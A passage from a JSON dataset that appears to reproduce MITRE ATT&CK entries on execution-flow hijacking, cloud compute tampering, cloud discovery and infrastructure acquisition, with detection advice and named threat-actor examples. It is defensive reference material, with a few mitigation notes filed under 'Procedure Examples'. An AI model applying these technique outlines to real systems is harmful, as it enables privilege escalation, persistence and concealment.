      "Monitor for programs metadata modifications such as deletion of the path to an executable since it makes programs vulnerable to this type of technique. Also, monitor modifications of files such as renaming programs using Windows system utilities names.",
      "Monitor for newly executed processes  for process executable paths that are named for partial directories."
    ],
    "Procedure Examples": [
      "Empirecontains modules that can discover and exploit search order hijacking vulnerabilities.[5]",
      "PowerSploitcontains a collection of Privesc-PowerUp modules that can discover and exploit search order hijacking vulnerabilities.[6][7]"
    ]
  },
  "T1574.009": {
    "Name": "Hijack Execution Flow:Path Interception by Unquoted Path",
    "Description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.Service paths[1]and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,C:\\unsafe path with space\\program.exevs.\"C:\\safe path with space\\program.exe\").[2](stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut isC:\\program files\\myapp.exe, an adversary may create a program atC:\\program.exethat will be run instead of the intended program.[3][4]This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
    "Detects": [
      "Monitor file creation for files named after partial directories and in locations that may be searched for common processes through the environment variable, or otherwise should not be user writable. Also, monitor file creation for programs that are named after Windows system programs or programs commonly executed without a path (such as \"findstr,\" \"net,\" and \"python\"). If this activity occurs outside of known administration activity, upgrades, installations, or patches, then it may be suspicious.",
      "Monitor for changes made to files that may execute their own malicious payloads by hijacking vulnerable file path references.",
      "Monitor for newly executed processes that may execute their own malicious payloads by hijacking vulnerable file path references."
    ],
    "Procedure Examples": [
      "Empirecontains modules that can discover and exploit unquoted path vulnerabilities.[5]",
      "PowerSploitcontains a collection of Privesc-PowerUp modules that can discover and exploit unquoted path vulnerabilities.[6][7]"
    ]
  },
  "T1574.010": {
    "Name": "Hijack Execution Flow:Services File Permissions Weakness",
    "Description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "Detects": [
      "Monitor for creation of binaries and service executables that do not occur during a regular software update or an update scheduled by the organization. This behavior also considers files that are overwritten.",
      "Monitor for modification of binaries and service executables that do not occur during a regular software update or an update scheduled by the organization. Modification of files considers actions such as renaming and directory moving.",
      "Monitor for newly executed processes that may execute their own malicious payloads by hijacking the binaries used by services.",
      "Hashing of binaries and service executables could be used to detect replacement against historical data."
    ],
    "Procedure Examples": [
      "One variant ofBlackEnergylocates existing driver services that have been disabled and drops its driver component into one of those service's paths, replacing the legitimate executable. The malware then sets the hijacked service to start automatically to establish persistence.[1]"
    ]
  },
  "T1574.011": {
    "Name": "Hijack Execution Flow:Services Registry Permissions Weakness",
    "Description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry underHKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,PowerShell, orReg. Access to Registry keys is controlled through access control lists and user permissions.[1][2]If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter other Registry keys in the service’s Registry tree. For example, theFailureCommandkey may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.[3][4]ThePerformancekey contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.[5]If thePerformancekey is not already present and if an adversary-controlled user has theCreate Subkeypermission, adversaries may create thePerformancekey in the service’s Registry tree to point to a malicious DLL.[6]Adversaries may also add theParameterskey, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.[5][7]Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified usingHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll.[2]",
    "Detects": [
      "Monitor for the execution of commands and arguments that can be used for adversaries to modify services' registry keys and values through applications such as Windows Management Instrumentation and PowerShell. Additional logging may need to be configured to gather the appropriate data.",
      "Monitor suspicious programs execution through services. These processes may show up as outlier processes that have not been seen before when compared against historical data.",
      "Modification to existing services should not occur frequently. If a service binary path or failure parameters are changed to values that are not typical for that service and does not correlate with software updates, then it may be due to malicious activity.",
      "Monitor for modification of Registry keys and values used by services such as HKLM\\SYSTEM\\CurrentControlSet\\Services that may allow adversaries to launch their own code when a service starts."
    ],
    "Procedure Examples": [
      "DuringOperation Honeybee, the threat actors used a batch file that modified the COMSysApp service to load a malicious ipnet.dll payload and to load a DLL into thesvchost.exeprocess.[8]"
    ]
  },
  "T1574.012": {
    "Name": "Hijack Execution Flow:COR_PROFILER",
    "Description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.[1][2]The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where aComponent Object Model(COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.[2]Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex:Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook andImpair Defensesprovided by .NET processes.[3][4][5][6][7]",
    "Detects": [
      "Extra scrutiny should be placed on suspicious modification of Registry keys such as COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH by command line tools like wmic.exe, setx.exe, andReg. Monitoring for command-line arguments indicating a change to COR_PROFILER variables may aid in detection.",
      "Monitor DLL files that are associated with COR_PROFILER environment variables.",
      "Monitor for newly executed processes, such as setx.exe, that may abuse of the COR_PROFILER variable, monitor for new suspicious unmanaged profiling DLLs loading into .NET processes shortly after the CLR causing abnormal process behavior.[4]",
      "For detecting system and user scope abuse of the COR_PROFILER variable, monitor the Registry for changes to COR_ENABLE_PROFILING, COR_PROFILER, and COR_PROFILER_PATH that correspond to system and user environment variables that do not correlate to known developer tools."
    ],
    "Procedure Examples": [
      "Blue Mockingbirdhas used wmic.exe and Windows Registry modifications to set the COR_PROFILER environment variable to execute a malicious DLL whenever a process loads the .NET CLR.[3]",
      "DarkTortillacan detect profilers by verifying theCOR_ENABLE_PROFILINGenvironment variable is present and active.[8]"
    ]
  },
  "T1574.013": {
    "Name": "Hijack Execution Flow:KernelCallbackTable",
    "Description": "Adversaries may abuse theKernelCallbackTableof a process to hijack its execution flow in order to run their own payloads.[1][2]TheKernelCallbackTablecan be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process onceuser32.dllis loaded.[3]An adversary may hijack the execution flow of a process using theKernelCallbackTableby replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such asReflective Code LoadingorProcess Injectioninto another process.A pointer to the memory address of theKernelCallbackTablecan be obtained by locating the PEB (ex: via a call to theNtQueryInformationProcess()Native APIfunction).[4]Once the pointer is located, theKernelCallbackTablecan be duplicated, and a function in the table (e.g.,fnCOPYDATA) set to the address of a malicious payload (ex: viaWriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.[1]The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, theKernelCallbackTablemay also be restored to its original state by the rest of the malicious payload.[1]Use of theKernelCallbackTableto hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process.",
    "Detects": [
      "Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances. for known bad sequence of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such asWriteProcessMemory()andNtQueryInformationProcess()with the parameter set toProcessBasicInformationmay be used for this technique.[1]"
    ],
    "Procedure Examples": [
      "FinFisherhas used theKernelCallbackTableto hijack the execution flow of a process by replacing the__fnDWORDfunction with the address of a createdAsynchronous Procedure Callstub routine.[2]",
      "Lazarus Grouphas abused theKernelCallbackTableto hijack process control flow and execute shellcode.[1][5]"
    ]
  },
  "T1574.014": {
    "Name": "Hijack Execution Flow:AppDomainManager",
    "Description": "Adversaries may execute their own malicious payloads by hijacking how the .NETAppDomainManagerloads assemblies. The .NET framework uses theAppDomainManagerclass to create and manage one or more isolated runtime environments (called application domains) inside a process to host the execution of .NET applications. Assemblies (.exeor.dllbinaries compiled to run as .NET code) may be loaded into an application domain as executable code.[1]Known as \"AppDomainManager injection,\" adversaries may execute arbitrary code by hijacking how .NET applications load assemblies. For example, malware may create a custom application domain inside a target process to load and execute an arbitrary assembly. Alternatively, configuration files (.config) or process environment variables that define .NET runtime settings may be tampered with to instruct otherwise benign .NET applications to load a malicious assembly (identified by name) into the target process.[2][3][4]",
    "Detects": [
      "Monitor for newly constructed files, especially unknown .NET assemblies and configuration files in user writable folder paths.",
      "Monitor DLL/PE file events, specifically creation of these binary files as well as the loading of .NET assemblies into processes (which may not always create standard image load events).Look for image loads that are not recognized or not normally loaded into a process.[2][4]",
      "Monitor newly constructed processes for unusual activity (e.g., a process that does not use the network begins to do so) as well as the loading of unexpected .NET resources."
    ],
    "Procedure Examples": [
      "IMAPLoaderis executed via the AppDomainManager injection technique.[5]"
    ]
  },
  "T1578": {
    "Name": "Modify Cloud Compute Infrastructure",
    "Description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.[1]",
    "Detects": [
      "Monitor for quota increases across all regions, especially multiple quota increases in a short period of time or quota increases in unused regions. Monitor for changes to tenant-level settings such as subscriptions and enabled regions.[2]",
      "The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.In AWS, CloudTrail logs capture the creation of an instance in the RunInstances event, and in Azure the creation of a VM may be captured in Azure activity logs.[3][4]Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of gcloud compute instances create to create a VM.[5]",
      "The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.In AWS, CloudTrail logs capture the deletion of an instance in the TerminateInstances event, and in Azure the deletion of a VM may be captured in Azure activity logs.[3][4]Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of gcloud compute instances delete to delete a VM.[5]",
      "Periodically baseline instances to identify malicious modifications or additions.",
      "Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
      "Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to activation of instances that are occurring outside of normal activity/planned operations. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
      "Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to deactivation of instances that are occurring outside of planned operations. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
      "Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
      "Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the deletion of multiple snapshots within a short period of time. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
      "Periodically baseline snapshots to identify malicious modifications or additions.",
      "Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the mounting of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
      "Monitor for the unexpected creation or presence of cloud block storage volumes . To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
      "Monitor for the unexpected deletion or absence of cloud block storage volumes . To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
      "Periodically baseline cloud block storage volumes to identify malicious modifications or additions.",
      "Monitor for the unexpected changes to cloud block storage volumes . To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
    ],
    "Procedure Examples": [
      "Routinely monitor user permissions to ensure only the expected users have the capability to modify cloud compute infrastructure components.",
      "Limit permissions for creating, deleting, and otherwise altering compute components in accordance with least privilege. Organizations should limit the number of users within the organization with an IAM role that has administrative privileges, strive to reduce all permanent privileged role assignments, and conduct periodic entitlement reviews on IAM users, roles and policies.[1]"
    ]
  },
  "T1578.001": {
    "Name": "Modify Cloud Compute Infrastructure:Create Snapshot",
    "Description": "An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike inRevert Cloud Instancewhere an adversary may revert to a snapshot to evade detection and remove evidence of their presence.An adversary mayCreate Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.[1]",
    "Detects": [
      "The creation of a snapshot is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities such as the creation of one or more snapshots and the restoration of these snapshots by a new user account.In AWS, CloudTrail logs capture the creation of snapshots and all API calls for AWS Backup as events. Using the information collected by CloudTrail, you can determine the request that was made, the IP address from which the request was made, which user made the request, when it was made, and additional details.[3]In Azure, the creation of a snapshot may be captured in Azure activity logs. Backup restoration events can also be detected through Azure Monitor Log Data by creating a custom alert for completed restore jobs.[4]Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of the gcloud compute instances create command to create a new VM disk from a snapshot.[5]It is also possible to detect the usage of the GCP API with thesourceSnapshotparameter pointed toglobal/snapshots/[BOOT_SNAPSHOT_NAME].[6]",
      "Periodically baseline snapshots to identify malicious modifications or additions."
    ],
    "Procedure Examples": [
      "Pacucan create snapshots of EBS volumes and RDS instances.[2]"
    ]
  },
  "T1578.002": {
    "Name": "Modify Cloud Compute Infrastructure:Create Cloud Instance",
    "Description": "An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary mayCreate Snapshotof one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collectData from Local Systemor forRemote Data Staging.[1]Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.",
    "Detects": [
      "The creation of a new instance or VM is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, the creation of an instance by a new user account or the unexpected creation of one or more snapshots followed by the creation of an instance may indicate suspicious activity.In AWS, CloudTrail logs capture the creation of an instance in the RunInstances event, and in Azure the creation of a VM may be captured in Azure activity logs.[5][6]Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of gcloud compute instances create to create a VM.[7]Analytic 1 - Operations performed by unexpected initiators, unusual resource names, frequent modificationsindex=\"azure_activity_logs\" (OperationName=\"Create or Update Virtual Machine\" OR OperationName=\"Create or Update Virtual Machine Extension\")| stats count by InitiatorName, Resource| where Resource LIKE \"Microsoft.Compute/virtualMachines*\" AND (Status!=\"Succeeded\" OR InitiatorName!=\"expected_initiator\")| sort by Time",
      "Periodically baseline instances to identify malicious modifications or additions."
    ],
    "Procedure Examples": [
      "DuringC0027,Scattered Spiderused access to the victim's Azure tenant to create Azure VMs.[2]",
      "LAPSUS$has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets.[3]",
      "DuringC0027,Scattered Spiderused access to the victim's Azure tenant to create Azure VMs.[2]Scattered Spiderhas also created Amazon EC2 instances within the victim's environment.[4]"
    ]
  },
  "T1578.003": {
    "Name": "Modify Cloud Compute Infrastructure:Delete Cloud Instance",
    "Description": "An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.An adversary may alsoCreate Cloud Instanceand later terminate the instance after achieving their objectives.[1]",
    "Detects": [
      "The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.In AWS, CloudTrail logs capture the deletion of an instance in the TerminateInstances event, and in Azure the deletion of a VM may be captured in Azure activity logs.[3][4]Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of gcloud compute instances delete to delete a VM.[5]Analytic 1 - Operations performed by unexpected initiators, unusual resource names, frequent deletionsindex=\"azure_activity_logs\" (OperationName=\"Delete Virtual Machine\" OR OperationName=\"Delete Disk\" OR OperationName=\"Delete Role Assignment\")| stats count by InitiatorName, Resource| where Resource LIKE \"Microsoft.Compute/virtualMachines*\" AND (Status!=\"Succeeded\" OR InitiatorName!=\"expected_initiator\")| sort by Time",
      "Periodically baseline instances to identify malicious modifications or additions."
    ],
    "Procedure Examples": [
      "LAPSUS$has deleted the target's systems and resources in the cloud to trigger the organization's incident and crisis response process.[2]"
    ]
  },
  "T1578.004": {
    "Name": "Modify Cloud Compute Infrastructure:Revert Cloud Instance",
    "Description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.Another variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.[1][2]",
    "Detects": [
      "Periodically baseline instances to identify malicious modifications or additions.",
      "Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
      "Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to activation of instances that are occurring outside of normal activity/planned operations. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones.",
      "Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to deactivation of instances that are occurring outside of planned operations. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
    ],
    "Procedure Examples": []
  },
  "T1578.005": {
    "Name": "Modify Cloud Compute Infrastructure:Modify Cloud Compute Configurations",
    "Description": "Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim’s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.For example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additionalResource Hijackingwithout raising suspicion by using up a victim’s entire quota.[1]Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.[2]Adversaries may also modify settings that affect where cloud resources can be deployed, such as enablingUnused/Unsupported Cloud Regions.",
    "Detects": [
      "Monitor for quota increases across all regions, especially multiple quota increases in a short period of time or quota increases in unused regions. In Azure environments, monitor for changes to tenant-level settings such as enabled regions.[1]"
    ],
    "Procedure Examples": [
      "Routinely monitor user permissions to ensure only the expected users have the capability to request quota adjustments or modify tenant-level compute settings.",
      "Limit permissions to request quotas adjustments or modify tenant-level compute setting to only those required."
    ]
  },
  "T1580": {
    "Name": "Cloud Infrastructure Discovery",
    "Description": "An adversary may attempt to discover infrastructure and resources that are available within an infrastructure-as-a-service (IaaS) environment. This includes compute service resources such as instances, virtual machines, and snapshots as well as resources of other services including the storage and database services.Cloud providers offer methods such as APIs and commands issued through CLIs to serve information about infrastructure. For example, AWS provides aDescribeInstancesAPI within the Amazon EC2 API that can return information about one or more instances within an account, theListBucketsAPI that returns a list of all buckets owned by the authenticated sender of the request, theHeadBucketAPI to determine a bucket’s existence along with access permissions of the request sender, or theGetPublicAccessBlockAPI to retrieve access block configuration for a bucket.[1][2][3][4]Similarly, GCP's Cloud SDK CLI provides thegcloud compute instances listcommand to list all Google Compute Engine instances in a project[5], and Azure's CLI commandaz vm listlists details of virtual machines.[6]In addition to API commands, adversaries can utilize open source tools to discover cloud storage infrastructure throughWordlist Scanning.[7]An adversary may enumerate resources using a compromised user's access keys to determine which are available to that user.[8]The discovery of these available resources may help adversaries determine their next steps in the Cloud environment, such as establishing Persistence.[9]An adversary may also use this information to change the configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such asDescribeDBInstancesto determine size, owner, permissions, and network ACLs of database resources.[10]Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike inCloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves.",
    "Detects": [
      "Monitor cloud logs for API calls and other potentially unusual activity related to cloud data object storage enumeration. Discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.",
      "Monitor cloud logs for API calls and other potentially unusual activity related to cloud instance enumeration. Discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.",
      "Monitor cloud logs for API calls and other potentially unusual activity related to snapshot enumeration. Discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained.",
      "Monitor cloud logs for API calls and other potentially unusual activity related to block object storage enumeration. Discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained."
    ],
    "Procedure Examples": [
      "Pacucan enumerate AWS infrastructure, such as EC2 instances.[11]",
      "Scattered Spiderenumerates cloud environments to identify server and backup management infrastructure, resource access, databases and storage containers.[12]"
    ]
  },
  "T1583": {
    "Name": "Acquire Infrastructure",
    "Description": "Adversaries may buy, lease, rent, or obtain infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.[1]Some infrastructure providers offer free trial periods, enabling infrastructure acquisition at limited to no cost.[2]Additionally, botnets are available for rent or purchase.Use of these infrastructure solutions allows adversaries to stage, launch, and execute operations. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contacting third-party web services or acquiring infrastructure to supportProxy, including from residential proxy services.[3][4][5]Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",
    "Detects": [
      "Monitor for queried domain name system (DNS) registry data that may buy, lease, or rent infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
      "Consider use of services that may aid in tracking of newly acquired infrastructure, such as WHOIS databases for domain registration information. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
      "Monitor for logged domain name system (DNS) data that may buy, lease, or rent infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
      "Once adversaries have provisioned infrastructure (ex: a server for use in command and control), internet scans may help proactively discover adversary acquired infrastructure. Consider looking for identifiable patterns such as services listening, certificates in use, SSL/TLS negotiation features, or other response artifacts associated with adversary C2 software.[13][14][15]Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control.",
      "Monitor for contextual data about an Internet-facing resource gathered from a scan, such as running services or ports that may buy, lease, or rent infrastructure that can be used during targeting. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Command and Control."
    ],
    "Procedure Examples": [
      "Agriustypically uses commercial VPN services for anonymizing last-hop traffic to victim networks, such as ProtonVPN.[6]",
      "Ember Bearuses services such as IVPN, SurfShark, and Tor to add anonymization to operations.[7]",
      "Indrik Spiderhas purchased access to victim VPNs to facilitate access to victim environments.[8]",
      "Kimsukyhas used funds from stolen and laundered cryptocurrency to acquire operational infrastructure.[9]",
      "Sandworm Teamused various third-party email campaign management services to deliver phishing emails.[10]",
      "Sea Turtleaccessed victim networks from VPN service provider networks.[11]",
      "Star Blizzardhas used HubSpot and MailerLite marketing platform services to hide the true sender of phishing emails.[12]"
    ]
  },
  "T1583.001": {
    "Name": "Acquire Infrastructure:Domains",
    "Description": "Adversaries may acquire domains that can be used during targeting. Domain names are the human readable names used to represent one or more IP addresses. They can be purchased or, in some cases, acquired for free.Adversaries may use acquired domains for a variety of purposes, including forPhishing,Drive-by Compromise, and Command and Control.[1]Adversaries may choose domains that are similar to legitimate domains, including through use of homoglyphs or use of a different top-level domain (TLD).[2][3]Typosquatting may be used to aid in delivery of payloads viaDrive-by Compromise. Adversaries may also use internationalized domain names (IDNs) and different character sets (e.g. Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually similar lookalike domains used to deliver malware to victim machines.[4][5][6][7][8]Different URIs/URLs may also be dynamically generated to uniquely serve malicious content to victims (including one-time, single use domain names).[9][10][11][12]Adversaries may also acquire and repurpose expired domains, which may be potentially already allowlisted/trusted by defenders based on an existing reputation/history.[13][14][15][16]Domain registrars each maintain a publicly viewable database that displays contact information for every registered domain. Private WHOIS services display alternative information, such as their own company data, rather than the owner of the domain. Adversaries may use such private WHOIS services to obscure information about who owns a purchased domain. Adversaries may further interrupt efforts to track their infrastructure by using varied registration information and purchasing domains with different domain registrars.[17]In addition to legitimately purchasing a domain, an adversary may register a new domain in a compromised environment. For example, in AWS environments, adversaries may leverage the Route53 domain service to register a domain and create hosted zones pointing to resources of the threat actor’s choosing.[18]",
    "Detects": [
      "Monitor queried domain name system (DNS) registry data for purchased domains that can be used during targeting. Reputation/category-based detection may be difficult until the categorization is updated. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control.",
      "Domain registration information is, by design, captured in public registration logs. Consider use of services that may aid in tracking of newly acquired domains, such as WHOIS databases and/or passive DNS. In some cases it may be possible to pivot on known pieces of domain registration information to uncover other infrastructure purchased by the adversary. Consider monitoring for domains created with a similar structure to your own, including under a different TLD. Though various tools and services exist to track, query, and monitor domain name registration information, tracking across multiple DNS infrastructures can require multiple tools/services or more advanced analytics.[100]Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control.",
      "Monitor logged domain name system (DNS) data for purchased domains that can be used during targeting. Reputation/category-based detection may be difficult until the categorization is updated. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access and Command and Control."
    ],
    "Procedure Examples": [
      "APT1has registered hundreds of domains for use in operations.[17]",
      "APT28registered domains imitating NATO, OSCE security websites, Caucasus information resources, and other organizations.[2][19][20]",
